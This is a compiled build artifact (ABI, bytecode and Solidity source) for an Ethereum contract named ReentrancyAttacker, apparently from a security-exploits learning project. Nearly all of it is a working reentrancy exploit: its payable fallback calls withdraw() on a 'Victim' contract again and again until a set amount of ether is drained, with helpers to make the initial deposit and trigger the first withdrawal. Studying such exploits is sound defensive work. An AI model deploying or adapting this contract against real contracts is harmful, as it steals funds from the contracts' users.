{
  "contractName": "ReentrancyAttacker",
  "abi": [
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "setTargetAmount",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "isSumBitch",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getContractBalance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "victim",
          "type": "address"
        },
        {
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "makeDeposit",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "victim",
          "type": "address"
        }
      ],
      "name": "makeWithdrawal",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50610396806100206000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680634d55ed9b1461010d5780636f9fb98a1461013a578063becd0d1014610165578063bf5d0a00146101a8578063fce1f07f146101f5575b60008054600154101561010a57346001600082825401925050819055503390508073ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156100f157600080fd5b505af1158015610105573d6000803e3d6000fd5b505050505b50005b34801561011957600080fd5b5061013860048036038101908080359060200190929190505050610224565b005b34801561014657600080fd5b5061014f610236565b6040518082815260200191505060405180910390f35b34801561017157600080fd5b506101a6600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610255565b005b3480156101b457600080fd5b506101f3600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506102da565b005b34801561020157600080fd5b5061020a610361565b604051808215151515815260200191505060405180910390f35b80600081905550600060018190555050565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b60008190508073ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156102be57600080fd5b505af11580156102d2573d6000803e3d6000fd5b505050505050565b60008290508073ffffffffffffffffffffffffffffffffffffffff1663d0e30db0836040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b15801561034357600080fd5b505af1158015610357573d6000803e3d6000fd5b5050505050505050565b600060019050905600a165627a7a72305820f05414989c5a65d12bbd1bf5cf43611d14e596d51c5baca99baf4178be208e5e0029",
  "source": "pragma solidity ^0.4.19;\n\ncontract ReentrancyAttacker {\n  uint256 targetAmount;\n  uint256 drainedAmount;\n\n  function setTargetAmount(uint256 amount) {\n    targetAmount = amount;\n    drainedAmount = 0;\n  }\n\n  function isSumBitch() constant returns (bool) {\n    return true;\n  }\n\n  function getContractBalance() constant returns (uint256) {\n    return this.balance;\n  }\n\n  function() payable {\n    if (drainedAmount < targetAmount) {\n      drainedAmount += msg.value;\n      Victim _victim = Victim(msg.sender);\n      _victim.withdraw();\n    }\n  }\n\n  function makeDeposit(address victim, uint amount) {\n    Victim _victim = Victim(victim);\n    _victim.deposit.value(amount)();\n  }\n\n  function makeWithdrawal(address victim) {\n    Victim _victim = Victim(victim);\n    _victim.withdraw();\n  }\n}\n\ncontract Victim {\n  function deposit() payable;\n  function withdraw();\n}",
  "sourcePath": "/home/hayek/proj/security-exploits/contracts/Reentrancy/ReentrancyAttacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.23+commit.124ca40d.Emscripten.clang"
  },
  "schemaVersion": "2.0.0",
  "updatedAt": "2018-06-24T04:16:54.714Z"
}